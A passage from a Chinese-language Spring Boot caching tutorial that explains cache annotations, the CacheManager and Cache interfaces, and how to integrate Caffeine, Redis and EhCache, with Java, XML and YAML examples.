class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@CacheEvict(cacheNames = &quot;users&quot;, key = &quot;#id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Executing deleteById from DB for ID: &quot;</span> + id);</span><br><span class="line">        <span class="comment">// 模拟从数据库删除</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CacheEvict(cacheNames = &quot;users&quot;, allEntries = true)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearAllUsersCache</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Clearing all users cache...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-4-Caching-和-CacheConfig：组合与配置"><a href="#2-1-4-Caching-和-CacheConfig：组合与配置" class="headerlink" title="2.1.4 @Caching 和 @CacheConfig：组合与配置"></a>2.1.4 <code>@Caching</code> 和 <code>@CacheConfig</code>：组合与配置</h4><ul>
<li><p><strong><code>@Caching</code>：</strong> 当一个方法需要应用多个不同类型的缓存注解时，可以使用 <code>@Caching</code> 将它们组合在一起。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Caching(</span></span><br><span class="line"><span class="meta">    put = &#123; @CachePut(cacheNames = &quot;user&quot;, key = &quot;#user.id&quot;) &#125;,</span></span><br><span class="line"><span class="meta">    evict = &#123; @CacheEvict(cacheNames = &quot;userList&quot;, allEntries = true) &#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">save</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 上述代码表示，在保存用户后，更新单个用户缓存，并清空用户列表缓存。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@CacheConfig</code>：</strong> 类级别的注解，用于抽取该类中所有缓存注解的公共配置，如 <code>cacheNames</code>。这有助于简化代码，避免重复。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@CacheConfig(cacheNames = &quot;users&quot;)</span> <span class="comment">// 在类级别统一配置缓存名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Cacheable(key = &quot;#id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findById</span><span class="params">(Long id)</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CachePut(key = &quot;#user.id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">updateUser</span><span class="params">(User user)</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CacheEvict(key = &quot;#id&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteById</span><span class="params">(Long id)</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="2-2-CacheManager-与-Cache-接口"><a href="#2-2-CacheManager-与-Cache-接口" class="headerlink" title="2.2 CacheManager 与 Cache 接口"></a>2.2 <code>CacheManager</code> 与 <code>Cache</code> 接口</h3><p><code>@Cacheable</code> 等注解之所以能工作，是因为 Spring AOP 在背后做了一系列操作。当我们调用一个带有缓存注解的方法时，Spring 的一个拦截器会介入，而这个拦截器正是通过 <code>CacheManager</code> 和 <code>Cache</code> 这两个核心接口来完成实际的缓存读写。</p>
<p><strong>从注解到接口：揭秘幕后工作原理</strong></p>
<p>让我们以 <code>@Cacheable(cacheNames = &quot;users&quot;, key = &quot;#id&quot;)</code> 为例，看看其背后发生了什么：</p>
<ol>
<li><strong>方法调用被拦截</strong>：当 <code>findById(1L)</code> 方法被调用时，Spring AOP 的缓存切面（<code>CacheInterceptor</code>）会首先拦截这个调用。</li>
<li><strong>获取 <code>CacheManager</code></strong>：拦截器会从 Spring 容器中获取已配置的 <code>CacheManager</code> Bean。</li>
<li><strong>获取 <code>Cache</code> 对象</strong>：拦截器调用 <code>cacheManager.getCache(&quot;users&quot;)</code> 方法，向管理器索要一个名为 “users” 的 <code>Cache</code> 实例。如果这个 <code>Cache</code> 不存在，<code>CacheManager</code> 可能会动态创建一个。</li>
<li><strong>在 <code>Cache</code> 中查找数据</strong>：拦截器根据注解中的 <code>key</code> 属性（<code>#id</code>，解析为 <code>1L</code>）作为键，调用 <code>cache.get(1L)</code> 方法在 <code>Cache</code> 实例中查找数据。</li>
<li><strong>决策与执行</strong>：<ul>
<li><strong>缓存命中</strong>：如果 <code>cache.get(1L)</code> 返回了非 <code>null</code> 的值，拦截器就直接将这个值返回给调用方，<strong>原始的 <code>findById</code> 方法体完全不会执行</strong>。</li>
<li><strong>缓存未命中</strong>：如果 <code>cache.get(1L)</code> 返回 <code>null</code>，拦截器会继续执行原始的 <code>findById</code> 方法。</li>
</ul>
</li>
<li><strong>填充缓存</strong>：方法执行成功后，拦截器会获取其返回值，然后调用 <code>cache.put(1L, returnedUserObject)</code>，将结果存入缓存中，以便下次使用。</li>
</ol>
<hr>
<h4 id="2-2-1-CacheManager-接口：缓存管理器"><a href="#2-2-1-CacheManager-接口：缓存管理器" class="headerlink" title="2.2.1 CacheManager 接口：缓存管理器"></a>2.2.1 <code>CacheManager</code> 接口：缓存管理器</h4><p><code>CacheManager</code> 是 Spring 缓存抽象的中心接口。你可以把它理解为一个<strong>工厂和注册中心</strong>，它负责管理应用中所有 <code>Cache</code> 实例的生命周期。</p>
<p><strong>核心职责：</strong></p>
<ul>
<li><strong>管理缓存集合</strong>：它维护着一个 <code>Cache</code> 实例的集合，每个 <code>Cache</code> 都有一个唯一的名称。</li>
<li><strong>提供 <code>Cache</code> 实例</strong>：其最核心的方法是 <code>getCache(String name)</code>，用于根据名称获取一个具体的 <code>Cache</code> 对象。</li>
<li><strong>配置入口</strong>：在 Spring 配置中，我们主要配置的就是 <code>CacheManager</code>。通过配置不同的 <code>CacheManager</code> 实现类，我们可以决定应用底层使用哪种缓存技术（如 Redis, Caffeine, EhCache 等），并对其进行统一的全局设置（如过期时间、最大容量等）。</li>
</ul>
<p><strong>常见的 <code>CacheManager</code> 实现类（由 Spring Boot 自动配置提供）：</strong></p>
<ul>
<li><code>ConcurrentMapCacheManager</code>：默认的实现，使用 <code>ConcurrentHashMap</code>作为底层存储，主要用于开发和测试，功能简单，不支持持久化和过期策略。</li>
<li><code>CaffeineCacheManager</code>：集成高性能的本地缓存库 Caffeine。</li>
<li><code>RedisCacheManager</code>：集成 Redis 作为分布式缓存。</li>
<li><code>EhCacheCacheManager</code>：集成经典的 EhCache 缓存库。</li>
<li><code>CompositeCacheManager</code>：一个组合管理器，可以让你同时使用多种不同类型的 <code>CacheManager</code>。</li>
</ul>
<hr>
<h4 id="2-2-2-Cache-接口：缓存本身"><a href="#2-2-2-Cache-接口：缓存本身" class="headerlink" title="2.2.2 Cache 接口：缓存本身"></a>2.2.2 <code>Cache</code> 接口：缓存本身</h4><p><code>Cache</code> 接口是对缓存这一概念的直接抽象，它定义了所有缓存都应具备的基本操作。无论底层是 <code>HashMap</code> 还是 Redis，它们都被统一封装为 <code>Cache</code> 接口。</p>
<p><strong>核心方法：</strong></p>
<ul>
<li><code>String getName()</code>: 获取此缓存的名称。</li>
<li><code>Object getNativeCache()</code>: 返回底层的、实际的缓存对象（例如，返回一个 <code>com.github.benmanes.caffeine.cache.Cache</code> 实例或一个 Redis 连接），这允许你在需要时绕过 Spring 的抽象，直接使用特定缓存技术的高级功能。</li>
<li><code>ValueWrapper get(Object key)</code>: 根据键从缓存中获取值。注意返回值是 <code>ValueWrapper</code>，这是为了能区分“缓存值为 <code>null</code>”和“缓存中不存在该键”这两种情况。如果键不存在，此方法返回 <code>null</code>；如果键存在但其值为 <code>null</code>，则返回一个包含 <code>null</code> 的 <code>ValueWrapper</code> 对象。</li>
<li><code>&lt;T&gt; T get(Object key, Class&lt;T&gt; type)</code>: 一个方便的泛型版本，直接返回指定类型的值。</li>
<li><code>void put(Object key, Object value)</code>: 将一个键值对存入缓存。</li>
<li><code>void evict(Object key)</code>: 从缓存中移除一个键对应的数据。</li>
<li><code>void clear()</code>: 清空整个缓存中的所有数据。</li>
</ul>
<hr>
<h4 id="2-2-3-配置-CacheManager-Bean-以-Caffeine-为例"><a href="#2-2-3-配置-CacheManager-Bean-以-Caffeine-为例" class="headerlink" title="2.2.3 配置 CacheManager Bean (以 Caffeine 为例)"></a>2.2.3 配置 <code>CacheManager</code> Bean (以 Caffeine 为例)</h4><p>虽然 Spring Boot 提供了强大的自动配置，但有时我们需要更精细化的控制，比如为不同的缓存设置不同的过期时间。这时，我们可以自定义一个 <code>CacheManager</code> Bean 来覆盖默认配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CacheManager <span class="title function_">cacheManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 CaffeineCacheManager</span></span><br><span class="line">        <span class="type">CaffeineCacheManager</span> <span class="variable">cacheManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CaffeineCacheManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置默认的缓存行为：写入后 10 分钟过期，最大容量 500</span></span><br><span class="line">        cacheManager.setCaffeine(Caffeine.newBuilder()</span><br><span class="line">                .expireAfterWrite(<span class="number">10</span>, TimeUnit.MINUTES)</span><br><span class="line">                .maximumSize(<span class="number">500</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果需要为特定的 cache name (如 &quot;users&quot;) 进行单独配置，可以这样做：</span></span><br><span class="line">        <span class="comment">// cacheManager.registerCustomCache(&quot;users&quot;,</span></span><br><span class="line">        <span class="comment">//     Caffeine.newBuilder()</span></span><br><span class="line">        <span class="comment">//         .expireAfterWrite(30, TimeUnit.MINUTES)</span></span><br><span class="line">        <span class="comment">//         .maximumSize(100)</span></span><br><span class="line">        <span class="comment">//         .build()</span></span><br><span class="line">        <span class="comment">// );</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cacheManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明</strong>：一旦你在配置类中定义了这样一个 <code>CacheManager</code> Bean，Spring Boot 将不会再使用它的默认自动配置，而是采用你提供的这个实例。</p>
</blockquote>
<hr>
<h4 id="2-2-4-编程式缓存操作：手动控制缓存"><a href="#2-2-4-编程式缓存操作：手动控制缓存" class="headerlink" title="2.2.4 编程式缓存操作：手动控制缓存"></a>2.2.4 编程式缓存操作：手动控制缓存</h4><p>除了使用注解，我们也可以在代码中直接注入 <code>CacheManager</code>，手动地对缓存进行读写。这在一些逻辑复杂、注解难以表达的场景下非常有用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ManualCacheService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CacheManager cacheManager;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 获取名为 &quot;users&quot; 的 Cache 对象</span></span><br><span class="line">        <span class="type">Cache</span> <span class="variable">usersCache</span> <span class="operator">=</span> cacheManager.getCache(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (usersCache == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Cache &#x27;users&#x27; is not configured.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 尝试从缓存中获取数据</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> usersCache.get(id, User.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Manual cache hit for ID: &quot;</span> + id);</span><br><span class="line">            <span class="keyword">return</span> user; <span class="comment">// 缓存命中，直接返回</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 缓存未命中，从数据库查询</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Manual cache miss. Fetching from DB for ID: &quot;</span> + id);</span><br><span class="line">        user = findUserInDatabase(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将查询结果放入缓存</span></span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            usersCache.put(id, user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> User <span class="title function_">findUserInDatabase</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟数据库查询</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(id, <span class="string">&quot;User&quot;</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个例子完整地展示了不使用注解的情况下，如何通过 <code>CacheManager</code> 和 <code>Cache</code> 接口实现与 <code>@Cacheable</code> 完全相同的逻辑。</p>
<hr>
<h3 id="2-3-常用缓存提供商集成"><a href="#2-3-常用缓存提供商集成" class="headerlink" title="2.3 常用缓存提供商集成"></a>2.3 常用缓存提供商集成</h3><p>Spring 的缓存抽象本身不提供缓存的存储实现，它只是一套标准和规范。我们需要集成第三方的缓存技术来作为“提供商”（Provider），为这套规范提供具体的实现。</p>
<p>得益于 Spring Boot 强大的自动配置能力，集成这些提供商通常只需要两步：</p>
<ol>
<li><strong>添加依赖</strong>：在 <code>pom.xml</code> 中引入相应的 Starter。</li>
<li><strong>修改配置</strong>：在 <code>application.properties</code> 或 <code>application.yml</code> 中指定使用哪种缓存类型。</li>
</ol>
<p>下面我们介绍三种最主流的缓存提供商：<strong>Caffeine</strong>（本地缓存）、<strong>Redis</strong>（分布式缓存）和 <strong>EhCache</strong>（传统本地&#x2F;磁盘缓存）。</p>
<hr>
<h4 id="2-3-1-Caffeine：高性能本地缓存"><a href="#2-3-1-Caffeine：高性能本地缓存" class="headerlink" title="2.3.1 Caffeine：高性能本地缓存"></a>2.3.1 Caffeine：高性能本地缓存</h4><ul>
<li><strong>简介</strong>：Caffeine 是一个基于 Java 8 的、近乎最优的高性能本地缓存库，被认为是 Google Guava Cache 的“继任者”。它提供了丰富的缓存过期策略、容量控制和命中率统计等功能。</li>
<li><strong>适用场景</strong>：<ul>
<li>单体应用或对性能要求极高的场景。</li>
<li>缓存那些读多写少、可以接受短暂不一致的数据（因为每个应用实例都有自己的独立缓存）。</li>
<li>不需要在多个服务实例间共享缓存。</li>
</ul>
</li>
</ul>
<p><strong>集成步骤：</strong></p>
<p><strong>① 添加依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot 缓存抽象的 Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Caffeine 缓存库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.ben-manes.caffeine<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>caffeine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 开启缓存：</strong> 确保主类上有 <code>@EnableCaching</code> 注解。</p>
<p><strong>③ 修改配置 (<code>application.yml</code>)：</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="comment"># 1. 告诉 Spring Boot 使用 Caffeine 作为缓存提供商</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">caffeine</span></span><br><span class="line">    <span class="comment"># 2. 配置 Caffeine 的规格 (spec)</span></span><br><span class="line">    <span class="attr">caffeine:</span></span><br><span class="line">      <span class="comment"># spec 是一种简洁的字符串格式，用于定义缓存的各种行为</span></span><br><span class="line">      <span class="comment"># initialCapacity: 初始容量</span></span><br><span class="line">      <span class="comment"># maximumSize: 最大容量</span></span><br><span class="line">      <span class="comment"># expireAfterWrite: 写入后多久过期</span></span><br><span class="line">      <span class="comment"># expireAfterAccess: 最后一次访问后多久过期</span></span><br><span class="line">      <span class="comment"># refreshAfterWrite: 写入后多久异步刷新</span></span><br><span class="line">      <span class="attr">spec:</span> <span class="string">initialCapacity=100,maximumSize=500,expireAfterWrite=10m</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>完成！</strong> 现在你项目中的所有 <code>@Cacheable</code> 等注解都会自动使用配置好的 Caffeine 缓存。无需修改任何 Java 代码。</p>
</blockquote>
<hr>
<h4 id="2-3-2-Redis：行业标准的分布式缓存"><a href="#2-3-2-Redis：行业标准的分布式缓存" class="headerlink" title="2.3.2 Redis：行业标准的分布式缓存"></a>2.3.2 Redis：行业标准的分布式缓存</h4><ul>
<li><strong>简介</strong>：Redis 是一个开源的、基于内存的键值对数据库，常被用作数据库、缓存和消息中间件。作为分布式缓存，它的数据独立于应用服务，可以被多个服务实例共享。</li>
<li><strong>适用场景</strong>：<ul>
<li>微服务架构或分布式集群环境。</li>
<li>需要跨多个服务实例共享缓存数据（例如，用户登录状态 Session 共享）。</li>
<li>缓存数据需要在应用重启后依然存在。</li>
</ul>
</li>
</ul>
<p><strong>集成步骤：</strong></p>
<p><strong>① 添加依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot 缓存抽象的 Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Spring Boot Data Redis 的 Starter (它包含了 Redis 客户端和核心依赖) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 开启缓存：</strong> 确保主类上有 <code>@EnableCaching</code> 注解。</p>
<p><strong>③ 修改配置 (<code>application.yml</code>)：</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment"># Redis 服务器连接配置</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="comment"># password: your-password</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="comment"># 1. 告诉 Spring Boot 使用 Redis 作为缓存提供商</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="comment"># 2. 配置 Redis 缓存的全局行为</span></span><br><span class="line">      <span class="comment"># 设置全局的缓存过期时间，例如 30 分钟</span></span><br><span class="line">      <span class="attr">time-to-live:</span> <span class="string">30m</span></span><br><span class="line">      <span class="comment"># 是否缓存 null 值，防止缓存穿透</span></span><br><span class="line">      <span class="attr">cache-null-values:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># key 的前缀，避免与其他 Redis 应用的 key 冲突</span></span><br><span class="line">      <span class="attr">key-prefix: myapp:cache:</span></span><br><span class="line">      <span class="comment"># 是否使用前缀</span></span><br><span class="line">      <span class="attr">use-key-prefix:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><strong>④ (重要) 配置序列化方式：</strong></p>
<p>默认情况下，Spring 使用 JDK 的序列化方式将 Java 对象存入 Redis，这会导致 Redis 中存储的是二进制乱码，可读性差且有跨语言兼容性问题。<strong>生产环境中强烈推荐使用 JSON 格式序列化</strong>。</p>
<p>创建一个配置类来定义 <code>RedisCacheConfiguration</code> Bean：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.cache.RedisCacheConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisCacheConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisCacheConfiguration <span class="title function_">redisCacheConfiguration</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">            <span class="comment">// 设置 key 的序列化方式为 String</span></span><br><span class="line">            .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>()))</span><br><span class="line">            <span class="comment">// 设置 value 的序列化方式为 JSON</span></span><br><span class="line">            .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-3-3-EhCache：传统的-JCache-实现"><a href="#2-3-3-EhCache：传统的-JCache-实现" class="headerlink" title="2.3.3 EhCache：传统的 JCache 实现"></a>2.3.3 EhCache：传统的 JCache 实现</h4><ul>
<li><strong>简介</strong>：EhCache 是一个成熟的、开源的 Java 缓存框架，它完全实现了 JCache (JSR-107) 标准。它支持内存、堆外内存和磁盘等多种存储层级。</li>
<li><strong>适用场景</strong>：<ul>
<li>需要遵循 JCache 标准的项目。</li>
<li>需要在应用重启后从磁盘恢复缓存数据的单体应用。</li>
<li>一些遗留项目或对 EhCache 有深厚技术栈依赖的团队。</li>
</ul>
</li>
</ul>
<p><strong>集成步骤：</strong></p>
<p><strong>① 添加依赖：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- JCache API --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 